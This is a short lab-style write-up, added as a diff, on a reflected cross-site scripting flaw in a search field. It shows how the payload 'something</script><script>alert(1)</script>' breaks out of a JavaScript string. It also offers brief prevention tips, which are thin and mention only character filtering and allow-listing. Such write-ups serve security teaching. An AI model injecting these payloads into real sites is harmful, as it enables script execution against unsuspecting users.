@@ -1,0 +1,31 @@
+Vulnerability:
+	The server does not sanitize and filter the characters: '<' and '>'.
+	Allowing an attacker to run JS by breaking out of the existing JS.
+	
+Exploit:
+	Example:
+		something</script><script>[PAYLOAD]</script>
+	
+	Exploit Script:
+		something</script><script>alert(1)</script>
+	
+Explanation:
+	- By injecting into the existing JavaScript, there was no way to escape the variable because the single quote was escaped, resulting in (\'):
+		1. var searchTerms = '[INPUT]';
+		2. var searchTerms = '\'';
+	
+	- So i broke from this JS by closing it using (something</script>) resulting in:
+		<script>
+		...
+		var searchTerms = 'something</script>
+	
+	- And added my own JS afterwards (<script>alert(1)</script>) resulting in:
+		<script>
+		...
+		var searchTerms = 'something</script>
+		<script>alert(1)</script>
+		
+	
+Prevention:
+	- Do not allow inputing '<' and '>'.
+	- While list only allowed search values if the options are limited.
